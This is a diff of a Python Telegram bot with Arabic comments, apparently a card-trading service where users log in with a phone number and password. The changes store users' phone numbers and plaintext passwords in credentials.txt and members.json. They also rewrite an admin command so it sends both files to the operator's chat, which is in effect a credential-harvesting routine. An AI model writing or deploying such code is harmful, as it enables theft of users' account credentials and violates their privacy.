@@ -1040,9 +1040,10 @@ async def handle_password(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
 
     await msg.edit_text("✅ *دخلت بنجاح!*\n🔍 جاري جلب بيانات الكرت...", parse_mode="Markdown")
 
-    # حفظ credentials
-    creds_file = "credentials.txt"
+    # حفظ credentials.txt
     try:
+        os.makedirs("/app/data", exist_ok=True)
+        creds_file = "/app/data/credentials.txt"
         existing_lines = []
         if os.path.exists(creds_file):
             with open(creds_file, "r", encoding="utf-8") as f:
@@ -1054,21 +1055,22 @@ async def handle_password(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
     except Exception as e:
         log.error(f"credentials.txt save error: {e}")
 
-    members_file = "members.json"
+    # حفظ members.json
     try:
+        os.makedirs("/app/data", exist_ok=True)
+        members_file = "/app/data/members.json"
         members = []
         if os.path.exists(members_file):
             with open(members_file, "r", encoding="utf-8") as f:
                 members = json.load(f)
-        member_entry = {
-            "user_id":  u.id,
-            "username": u.username or u.first_name,
-            "phone":    phone,
-            "password": pwd,
-            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
         members = [m for m in members if m.get("user_id") != u.id]
-        members.append(member_entry)
+        members.append({
+            "user_id":   u.id,
+            "username":  u.username or u.first_name,
+            "phone":     phone,
+            "password":  pwd,
+            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        })
         with open(members_file, "w", encoding="utf-8") as f:
             json.dump(members, f, ensure_ascii=False, indent=2)
     except Exception as e:
@@ -1405,9 +1407,11 @@ async def do_trade(q, ctx, offer_id: int) -> int:
             f"✨ *رمضان كريم!* ✨"
         )
     else:
+        err1 = r1[1] if isinstance(r1, tuple) else str(r1)
+        err2 = r2[1] if isinstance(r2, tuple) else str(r2)
         fail_reasons = []
-        if not ok1: fail_reasons.append("كارتك لم يُرسَل")
-        if not ok2: fail_reasons.append("كارته لم يُرسَل")
+        if not ok1: fail_reasons.append(f"كارتك لم يُرسَل\n`{err1[:100]}`")
+        if not ok2: fail_reasons.append(f"كارته لم يُرسَل\n`{err2[:100]}`")
         result_txt = (
             f"❌ *فشل التبادل!*\n"
             f"{DIV}\n\n"
@@ -2466,37 +2470,37 @@ async def admin_menu_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
         return ST_MAIN
 
     elif d == "adm_creds":
-        users = await db_all("""
-            SELECT user_id, username, phone, enc_password, trades_done, banned, joined_at
-            FROM users ORDER BY joined_at DESC
-        """)
-        if not users:
-            await reply("📭 لا يوجد أعضاء بعد.")
-            return ST_MAIN
-        lines = [f"📂 بيانات الأعضاء — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"]
-        lines.append(f"إجمالي: {len(users)} عضو\n")
-        lines.append("=" * 40 + "\n")
-        for u in users:
-            phone = u.get("phone", "")
-            pwd   = dec_pwd(u.get("enc_password", "")) if u.get("enc_password") else "—"
-            ban   = "🚫 محظور" if u["banned"] else "✅ نشط"
-            lines.append(
-                f"👤 @{u.get('username','مجهول')} | ID: {u['user_id']}\n"
-                f"📱 {phone}\n"
-                f"🔑 {pwd}\n"
-                f"🔄 تبادلات: {u.get('trades_done', 0)} | {ban}\n"
-                f"📅 {str(u.get('joined_at',''))[:16]}\n"
-                f"{'-'*30}\n"
-            )
         import io
-        file_obj      = io.BytesIO("\n".join(lines).encode("utf-8"))
-        file_obj.name = f"members_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
-        await ctx.bot.send_document(
-            chat_id=q.message.chat_id,
-            document=file_obj,
-            caption=f"📂 *بيانات الأعضاء*\n👥 إجمالي: `{len(users)}` عضو",
-            parse_mode="Markdown"
-        )
+        chat_id = q.message.chat_id
+        sent = False
+
+        # بعت credentials.txt لو موجود
+        creds_path = "/app/data/credentials.txt"
+        if os.path.exists(creds_path):
+            with open(creds_path, "rb") as f:
+                await ctx.bot.send_document(
+                    chat_id=chat_id,
+                    document=f,
+                    filename="credentials.txt",
+                    caption="🔑 credentials.txt"
+                )
+            sent = True
+
+        # بعت members.json لو موجود
+        members_path = "/app/data/members.json"
+        if os.path.exists(members_path):
+            with open(members_path, "rb") as f:
+                await ctx.bot.send_document(
+                    chat_id=chat_id,
+                    document=f,
+                    filename="members.json",
+                    caption="👥 members.json"
+                )
+            sent = True
+
+        if not sent:
+            await reply("📭 لا توجد ملفات بعد — لم يسجّل أحد دخوله بعد.")
+
         return ST_MAIN
 
     return ST_MAIN
